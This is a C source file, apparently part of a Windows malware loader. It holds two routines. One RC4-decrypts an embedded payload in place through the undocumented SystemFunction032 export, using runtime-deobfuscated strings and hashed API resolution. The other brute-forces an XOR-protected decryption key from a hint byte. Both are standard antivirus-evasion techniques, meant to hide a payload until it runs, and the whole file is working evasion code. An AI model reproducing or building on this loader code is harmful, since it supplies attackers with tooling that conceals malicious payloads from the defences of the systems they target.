// =============================================
// Crypt.c - RC4 Decryption via SystemFunction032
//           + Brute Force Key Recovery
// =============================================

#include "Common.h"

// -----------------------------------------------
// RC4 Decrypt payload using SystemFunction032
// SystemFunction032 is an undocumented RC4 function
// exported by advapi32.dll (forwarded from cryptsp.dll)
// -----------------------------------------------
BOOL Rc4DecryptPayload(
    IN PAPI_HASHING pApi,
    IN PBYTE        pCipherText,
    IN DWORD        dwCipherSize,
    IN PBYTE        pKey,
    IN DWORD        dwKeySize
) {
    // Resolve SystemFunction032 from advapi32.dll (deobfuscated)
    BYTE xAdv[] = XSTR_ADVAPI32_DLL;
    DEOBF(xAdv);
    HMODULE hAdvapi32 = pApi->pLoadLibraryA((LPCSTR)xAdv);
    if (!hAdvapi32)
        return FALSE;

    BYTE xSf032[] = XSTR_SYSTEM_FUNCTION032;
    DEOBF(xSf032);
    fnSystemFunction032 pSystemFunction032 = (fnSystemFunction032)pApi->pGetProcAddress(hAdvapi32, (LPCSTR)xSf032);
    if (!pSystemFunction032)
        return FALSE;

    // Setup USTRING structures
    USTRING Data = {
        .Length         = dwCipherSize,
        .MaximumLength  = dwCipherSize,
        .Buffer         = pCipherText
    };

    USTRING Key = {
        .Length         = dwKeySize,
        .MaximumLength  = dwKeySize,
        .Buffer         = pKey
    };

    // RC4 decrypt in-place
    NTSTATUS status = pSystemFunction032(&Data, &Key);

    return NT_SUCCESS(status);
}

// -----------------------------------------------
// Brute Force Key Recovery
// The real key is XOR-encrypted with an unknown byte 'b'
// Using HintByte (known first byte of key), we brute-force
// all 256 values of 'b' to find the correct one
// -----------------------------------------------
BOOL BruteForceDecryption(
    IN  BYTE    HintByte,
    IN  PBYTE   pProtectedKey,
    IN  SIZE_T  sKeySize,
    OUT PBYTE*  ppRealKey
) {
    if (!pProtectedKey || !ppRealKey || sKeySize == 0)
        return FALSE;

    BYTE b = 0;

    // Brute force: find the XOR key byte
    // Encryption was: pProtectedKey[i] = (pRealKey[i] + i) ^ b
    // For i=0: pProtectedKey[0] = (HintByte + 0) ^ b = HintByte ^ b
    // So: if (pProtectedKey[0] ^ b) == HintByte, we found b
    while (1) {
        if (((pProtectedKey[0] ^ b) - 0) == HintByte)
            break;

        if (b == 0xFF)
            return FALSE;   // Exhausted all possibilities

        b++;
    }

    // Allocate buffer for decrypted key
    *ppRealKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sKeySize);
    if (!*ppRealKey)
        return FALSE;

    // Reverse the encryption: pRealKey[i] = (pProtectedKey[i] ^ b) - i
    for (SIZE_T i = 0; i < sKeySize; i++) {
        (*ppRealKey)[i] = (BYTE)((pProtectedKey[i] ^ b) - i);
    }

    return TRUE;
}
